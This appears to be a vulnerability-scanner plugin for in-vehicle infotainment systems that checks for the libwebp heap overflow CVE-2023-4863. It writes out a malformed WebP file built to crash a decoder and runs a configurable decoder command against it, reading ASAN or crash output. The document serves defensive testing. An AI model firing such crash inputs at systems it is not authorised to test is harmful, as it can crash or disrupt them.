#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import os
import shlex
import subprocess
import tempfile

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 92,
    "cve": "CVE-2023-4863",
    "year": 2023,
    "domain": "IVI/浏览器/媒体",
    "vendor_product": "libwebp",
    "component": "WebP decoder",
    "type": "堆溢出/RCE",
    "summary": "车机浏览器/消息预览/媒体解析若使用libwebp可能受影响。",
    "source_description": "Heap buffer overflow in libwebp in Google Chrome prior to 116.0.5845.187 and libwebp 1.3.2 allowed a remote attacker to perform an out of bounds memory write via a crafted HTML page. (Chromium security severity: Critical)",
    "poc_status": "有公开PoC",
    "research_value": "作为智能网联汽车常见基础组件/无线协议/车载互联依赖的关联漏洞纳入。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4863",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-4863",
        "https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html",
        "https://crbug.com/1479274",
        "https://en.bandisoft.com/honeyview/history/",
        "https://stackdiary.com/critical-vulnerability-in-webp-codec-cve-2023-4863/",
        "https://www.mozilla.org/en-US/security/advisories/mfsa2023-40/",
        "https://github.com/webmproject/libwebp/commit/902bc9190331343b2017211debcec8d2ab87e17a",
        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-4863",
        "https://security-tracker.debian.org/tracker/CVE-2023-4863",
        "https://bugzilla.suse.com/show_bug.cgi?id=1215231",
        "https://news.ycombinator.com/item?id=37478403",
        "https://cveawg.mitre.org/api/cve/CVE-2023-4863"
    ],
    "affected": [
        {
            "vendor": "Google",
            "product": "Chrome",
            "versions": [
                {
                    "version": "116.0.5845.187",
                    "status": "affected",
                    "lessThan": "116.0.5845.187",
                    "versionType": "custom"
                }
            ]
        },
        {
            "vendor": "Google",
            "product": "libwebp",
            "versions": [
                {
                    "version": "1.3.2",
                    "status": "affected",
                    "lessThan": "1.3.2",
                    "versionType": "custom"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2023-4863",
        "libwebp",
        "WebP",
        "decoder",
        "RCE",
        "Heap",
        "buffer",
        "overflow",
        "Google",
        "Chrome",
        "prior",
        "allowed",
        "remote",
        "perform",
        "bounds",
        "memory",
        "write",
        "crafted",
        "HTML",
        "page",
        "Chromium",
        "security",
        "severity",
        "Critical"
    ]
}


def _write_malformed_webp_sample() -> str:
    fd, path = tempfile.mkstemp(prefix="autosec_cve_2023_4863_", suffix=".webp")
    # Minimal RIFF/WEBP container with an oversized VP8L chunk header. This is a
    # crash-oriented decoder stimulus, not a weaponized RCE payload.
    payload = (
        b"RIFF" + (0x120).to_bytes(4, "little") + b"WEBP"
        b"VP8L" + (0x114).to_bytes(4, "little")
        + b"\x2f\xff\xff\xff\x0f"
        + b"A" * 0x100
    )
    with os.fdopen(fd, "wb") as handle:
        handle.write(payload)
    return path


def _webp_decoder_probe(plugin, vuln):
    supplied_sample = plugin.params.get("webp_sample_path") or plugin.params.get("sample_path")
    sample = str(supplied_sample) if supplied_sample else _write_malformed_webp_sample()
    cmd = plugin.params.get("decoder_cmd") or plugin.params.get("webp_decoder_cmd")
    evidence = {
        "ok": True,
        "sample_path": sample,
        "payload_bytes": os.path.getsize(sample),
        "sample_source": "provided_sample" if supplied_sample else "generated_stimulus",
        "phenomenon": "malformed WebP sample prepared for decoder crash observation",
        "requires_manual_review": True,
    }
    if not cmd:
        evidence["operator_action"] = "Run a lab decoder/browser against sample_path or pass webp_decoder_cmd/decoder_cmd to observe crash/ASAN output."
        return evidence
    started = subprocess.run(
        shlex.split(str(cmd)) + [sample],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=float(plugin.params.get("timeout", 10)),
        check=False,
    )
    stderr = started.stderr.decode("utf-8", errors="replace")
    evidence.update({
        "command": cmd,
        "returncode": started.returncode,
        "stderr_excerpt": stderr[:1000],
        "vulnerable": started.returncode < 0 or any(token in stderr.lower() for token in ("asan", "heap", "overflow", "segmentation fault", "crash")),
        "phenomenon": "decoder process executed against malformed WebP sample",
    })
    return evidence



def _run_poc(plugin, vuln=None) -> dict:
    """
    CVE-2023-4863 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CVE-2023-4863") if vuln else "CVE-2023-4863",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class Poc64CVE20234863RCEAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-064"
    meta_poc_name = 'CVE-2023-4863 RCE Active Validation'
    meta_cve_id = 'CVE-2023-4863'
    meta_severity = 'Critical'
    meta_protocol = 'http'
    meta_target_os = ['all']
    meta_required_params = ['software_inventory_text']
    meta_profiles = ['application']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2023-4863'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2023-4863']
    meta_attack_surface = '车机APP/应用'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_webp_decoder_probe)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "64_LibWebP_Decoder_Heap_Overflow_RCE_Audit") if "VULN" in dir() else "64_LibWebP_Decoder_Heap_Overflow_RCE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc64CVE20234863RCEAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
